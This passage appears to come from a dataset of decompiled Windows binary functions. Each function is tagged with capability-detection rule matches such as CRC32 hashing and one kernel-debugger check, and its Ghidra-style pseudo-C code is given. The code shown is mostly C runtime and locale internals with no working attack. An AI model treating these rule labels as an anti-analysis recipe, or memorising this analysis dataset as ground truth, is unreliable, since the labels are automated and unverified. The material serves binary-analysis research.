0;\n        }\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.0040267b(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00401582(&var_ch);\n        }\n    }\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.004058f8();\n    if (cVar1 != '\\0') {\n        uVar3 = *(in_ECX + 0x20);\n        arg_ch_00 = var_8h;\n        arg_8h_00 = var_ch;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n            uVar3 = uVar3 | 0x40;\n            *(in_ECX + 0x20) = uVar3;\n            arg_ch_00 = -(var_8h + (var_ch != 0));\n            arg_8h_00 = -var_ch;\n        }\n        if (*(in_ECX + 0x28) < 0) {\n            *(in_ECX + 0x28) = 1;\n        }\n        else {\n            *(in_ECX + 0x20) = uVar3 & 0xfffffff7;\n            fcn.004057e0(*(in_ECX + 0x28));\n        }\n        if ((arg_8h_00 | arg_ch_00) == 0) {\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n        }\n        *(in_ECX + 0x3c) = 1;\n        if (var_4h == 8) {\n            fcn.004018a2(arg_8h_00, arg_ch_00, arg_8h, arg_ch);\n        }\n        else {\n            fcn.0040316b(arg_8h_00, arg_8h, arg_ch);\n        }\n        if (((*(in_ECX + 0x20) >> 7 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (**(in_ECX + 0x34) != 0x30)))) {\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n            **(in_ECX + 0x34) = 0x30;\n            *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1021
    },
    "00404340": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404340(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00401df2(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "004044ad": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004044ad(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if ((*(arg_8h + 0xc) >> 0xc & 1) == 0) {\n        uVar1 = fcn.00405f06(arg_8h);\n        iVar4 = 0x56cf68;\n        if ((uVar1 == 0xffffffff) || (uVar1 == 0xfffffffe)) {\n            iVar5 = 0x56cf68;\n        }\n        else {\n            iVar5 = (uVar1 & 0x3f) * 0x38 + *((uVar1 >> 6) * 4 + 0x570220);\n        }\n        if (*(iVar5 + 0x29) == '\\0') {\n            if ((uVar1 != 0xffffffff) && (uVar1 != 0xfffffffe)) {\n                iVar4 = (uVar1 & 0x3f) * 0x38 + *((uVar1 >> 6) * 4 + 0x570220);\n            }\n            if ((*(iVar4 + 0x2d) & 1) == 0) goto code_r0x004a6d86;\n        }\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n        uVar3 = 0;\n    }\n    else {\ncode_r0x004a6d86:\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 375
    },
    "004044d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004044d0(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    \n    if (arg_8h == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = 0xffffffff;\n        if ((*(arg_8h + 0xc) >> 0xd & 1) != 0) {\n            uVar2 = fcn.0040420a(arg_8h);\n            fcn.00403468(arg_8h);\n            arg_8h_00 = fcn.00405f06(arg_8h);\n            iVar3 = fcn.0040516e(arg_8h_00);\n            if (iVar3 < 0) {\n                uVar2 = 0xffffffff;\n            }\n            else if (*(arg_8h + 0x1c) != 0) {\n                fcn.00406302(*(arg_8h + 0x1c));\n                *(arg_8h + 0x1c) = 0;\n            }\n        }\n        fcn.00406532(arg_8h);\n    }\n    return uVar2;\n}\n",
        "token_count": 312
    },
    "004044e4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004044e4(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar2 = fcn.0040185c();\n        *puVar2 = 0;\n        puVar2 = fcn.004039a4();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h) && (arg_8h < *0x570488)) {\n            iVar3 = (arg_8h & 0x3f) * 0x38;\n            iVar1 = *((arg_8h >> 6) * 4 + 0x570220);\n            if ((*(iVar1 + 0x28 + iVar3) & 1) != 0) {\n                return *(iVar1 + 0x18 + iVar3);\n            }\n        }\n        puVar2 = fcn.0040185c();\n        *puVar2 = 0;\n        puVar2 = fcn.004039a4();\n        *puVar2 = 9;\n        fcn.00403751();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 278
    },
    "00404561": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404561(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x3c;\n    fcn.004030e9();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.004024b9(0x58, uVar4);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406541();\n            uVar4 = fcn.0040465b(uVar4);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar2 = vtable.std::_Mpunct_unsigned_short_int_.0;\n            *(ppcVar2 + 10) = 1;\n            fcn.004039b3(uVar4, 1);\n            *ppcVar2 = vtable.std::moneypunct_unsigned_short_int__1_.0;\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fb4();\n        }\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 447
    },
    "0046bc42": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bc42(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Mpunct_wchar_t_.0;\n    fcn.00405e1b();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "004045de": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004045de(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00402e64(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "0040460b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040460b(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.004044e4(arg_8h);\n    if (iVar1 != -1) {\n        if (((arg_8h == 1) && ((*(*0x570220 + 0x98) & 1) != 0)) || ((arg_8h == 2 && ((*(*0x570220 + 0x60) & 1) != 0))))\n        {\n            iVar1 = fcn.004044e4(2);\n            iVar2 = fcn.004044e4(1);\n            if (iVar2 == iVar1) goto code_r0x004ce880;\n        }\n        uVar3 = fcn.004044e4(arg_8h);\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x004ce8d2;\n        }\n    }\ncode_r0x004ce880:\n    iVar1 = 0;\ncode_r0x004ce8d2:\n    fcn.004031a2(arg_8h);\n    *(*((arg_8h >> 6) * 4 + 0x570220) + 0x28 + (arg_8h & 0x3f) * 0x38) = 0;\n    if (iVar1 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        fcn.00404b01(iVar1);\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 396
    },
    "00404732": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00404732(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < arg_8h) && (arg_8h < *0x570488)) &&\n           ((*(*((arg_8h >> 6) * 4 + 0x570220) + 0x28 + (arg_8h & 0x3f) * 0x38) & 1) != 0)) {\n            var_ch = &arg_8h;\n            var_8h = arg_8h;\n            var_10h = arg_8h;\n            uVar2 = fcn.004ceb97(&var_10h, &var_ch);\n            return uVar2;\n        }\n        puVar1 = fcn.004039a4();\n        *puVar1 = 9;\n        fcn.00403751();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 301
    },
    "0047e178": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e178(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0040485e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040485e(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, uint arg_20h\n            , uint32_t arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    fcn.0040279d(arg_10h);\n    iVar2 = fcn.00402ad6();\n    if ((((*(iVar2 + 0x20) != 0) || (*arg_8h == -0x1f928c9d)) || (*arg_8h == -0x7fffffda)) ||\n       (((*arg_18h & 0x1fffffff) < 0x19930522 || ((*(arg_18h + 8) & 1) == 0)))) {\n        if ((*(arg_8h + 1) & 0x66) == 0) {\n            if (((arg_18h[3] != 0) || ((0x19930520 < (*arg_18h & 0x1fffffff) && (arg_18h[7] != 0)))) ||\n               ((0x19930521 < (*arg_18h & 0x1fffffff) && ((arg_18h[8] >> 2 & 1) != 0)))) {\n                if ((((*arg_8h == -0x1f928c9d) && (2 < arg_8h[4])) && (0x19930522 < arg_8h[5])) &&\n                   (pcVar1 = *(arg_8h[7] + 8),  pcVar1 != NULL)) {\n                    (**0x573000)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h & 0xff);\n                    uVar3 = (*pcVar1)();\n                    return uVar3;\n                }\n                fcn.00487e3b(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_24h, arg_1ch, arg_20h);\n            }\n        }\n        else if ((arg_18h[1] != 0) && (arg_1ch == 0)) {\n            fcn.00403d91(arg_ch, arg_14h, arg_18h);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 565
    },
    "0040498a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040498a(uint32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint CodePage;\n    int32_t iVar2;\n    uint arg_14h;\n    uint32_t uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        iVar1 = fcn.0040379c();\n        iVar1 = *(iVar1 + 8);\n        CodePage = fcn.00403030();\n    }\n    else {\n        iVar1 = arg_ch[3];\n        CodePage = *arg_ch;\n    }\n    if (iVar1 == 0) {\n        if (arg_8h < 0x61) {\n            return arg_8h;\n        }\n        if (0x7a < arg_8h) {\n            return arg_8h;\n        }\n        return arg_8h - 0x20;\n    }\n    if (arg_8h < 0x100) {\n        if (arg_ch == NULL) {\n            iVar2 = fcn.00403fbc(arg_8h);\n            if (iVar2 == 0) {\n                return arg_8h;\n            }\ncode_r0x00463076:\n            iVar2 = fcn.00404d04();\n            uVar3 = *(iVar2 + (arg_8h >> 8 & 0xffU) * 2) & 0x8000;\n            goto code_r0x0046305f;\n        }\n        if ((*(arg_ch[1] + arg_8h * 2) & 2) == 0) {\n            return arg_8h;\n        }\n    }\n    else if (arg_ch == NULL) goto code_r0x00463076;\n    uVar3 = *(arg_ch[1] + (arg_8h >> 8 & 0xffU) * 2) >> 0xf & 1;\ncode_r0x0046305f:\n    if (uVar3 == 0) {\n        var_4h._1_1_ = 0;\n        arg_14h = 1;\n        var_4h._0_1_ = arg_8h;\n    }\n    else {\n        var_4h._2_1_ = 0;\n        arg_14h = 2;\n        var_4h._0_1_ = arg_8h >> 8;\n        var_4h._1_1_ = arg_8h;\n    }\n    iVar1 = fcn.00402b53(iVar1, 0x200, &var_4h, arg_14h, &var_8h, 3, CodePage, 1);\n    if ((iVar1 != 0) && (arg_8h = var_8h,  iVar1 != 1)) {\n        arg_8h = CONCAT11(var_8h, var_8h._1_1_);\n    }\n    return arg_8h;\n}\n",
        "token_count": 685
    },
    "004049d5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004049d5(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar4;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar5;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar5 = param_1[10];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[10] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar5 = 0,  *(param_1 + 0x31) == 'G')))) {\n        param_1[10] = 1;\n        iVar5 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00404bb5(iVar5 + 0x15d);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.00405911();\n        param_1[10] = iVar5 + -0x15d;\n    }\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar3;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.00405911();\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    iVar5 = *(param_1 + 0x31);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.004030f8();\n    arg_10h = fcn.00405911();\n    fcn.00404156(&var_8h, puVar3, arg_10h, arg_14h, arg_18h, iVar5, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.0040229d(param_1[0xd], param_1[2]);\n    }\n    if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n        fcn.00405b23(param_1[0xd], param_1[2]);\n    }\n    pcVar4 = param_1[0xd];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xd] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        *(param_1 + 0x31) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xe] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1079
    },
    "00404a61": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404a61(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x3c;\n    fcn.004030e9();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.004024b9(0x58, uVar4);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406541();\n            uVar4 = fcn.0040465b(uVar4);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar2 = vtable.std::_Mpunct_char_.0;\n            *(ppcVar2 + 10) = 0;\n            fcn.004024cd(uVar4, 1);\n            *ppcVar2 = vtable.std::moneypunct_char__0_.0;\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fb4();\n        }\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 443
    },
    "00404a6b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00404a6b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b038, 0xc);\n    lpCriticalSection = *(unaff_EBP + 0xc);\n    if (lpCriticalSection == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        *(unaff_EBP + -0x1c) = 0;\n        fcn.004013f7(lpCriticalSection);\n        *(unaff_EBP + -4) = 0;\n        if ((*(lpCriticalSection + 0xc) >> 0xc & 1) != 0) {\ncode_r0x004ae5d8:\n            uVar2 = fcn.0040464c(*(unaff_EBP + 8), lpCriticalSection);\n            *(unaff_EBP + -0x1c) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.004ae60c();\n            goto code_r0x004ae5f6;\n        }\n        uVar3 = fcn.00405f06(lpCriticalSection);\n        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n            iVar5 = 0x56cf68;\n        }\n        else {\n            iVar5 = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x570220);\n        }\n        iVar4 = 0x56cf68;\n        if (*(iVar5 + 0x29) == '\\0') {\n            if ((uVar3 != 0xffffffff) && (uVar3 != 0xfffffffe)) {\n                iVar4 = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x570220);\n            }\n            if ((*(iVar4 + 0x2d) & 1) == 0) goto code_r0x004ae5d8;\n        }\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        fcn.00402e7d(0x56cca8, unaff_EBP + -0x10, 0xfffffffe);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004ae5f6:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 699
    },
    "00404af7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404af7(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402739(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.004039a4();\n                *puVar2 = 0x16;\n                uVar3 = fcn.00403751();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a324b;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a324b;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a324b:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.00404bb5(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 0;\n    if (iVar1 == 8) {\n        fcn.00404304(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.00403dd2(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1114
    },
    "00404ba6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404ba6(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402739(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.004039a4();\n                *puVar2 = 0x16;\n                uVar3 = fcn.00403751();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a391b;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a391b;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a391b:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.004057e0(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 1;\n    if (iVar1 == 8) {\n        fcn.00406113(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.00403f26(uVar3, arg_8h, arg_ch);\n    }\n    piVar4 = *(in_ECX + 0x20) >> 7;\n    if (((piVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (piVar4 = *(in_ECX + 0x34),  *piVar4 != 0x30)))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 1117
    },
    "00404c8c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404c8c(uint32_t arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    fcn.00405f06(arg_ch);\n    if ((arg_ch[3] & 6) == 0) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 9;\n    }\n    else {\n        if ((arg_ch[3] >> 0xc & 1) == 0) {\n            if ((arg_ch[3] & 1) != 0) {\n                cVar1 = fcn.004d0de2(arg_ch);\n                arg_ch[2] = 0;\n                if (cVar1 == '\\0') goto code_r0x004d0ad8;\n                *arg_ch = arg_ch[1];\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffffe;\n            }\n            LOCK();\n            arg_ch[3] = arg_ch[3] | 2;\n            LOCK();\n            arg_ch[3] = arg_ch[3] & 0xfffffff7;\n            arg_ch[2] = 0;\n            if (((arg_ch[3] & 0x4c0) == 0) && (cVar1 = fcn.004052ae(arg_ch),  cVar1 == '\\0')) {\n                fcn.00401faf(arg_ch);\n            }\n            cVar1 = fcn.004d0ce1(arg_8h, arg_ch);\n            if (cVar1 == '\\0') {\n                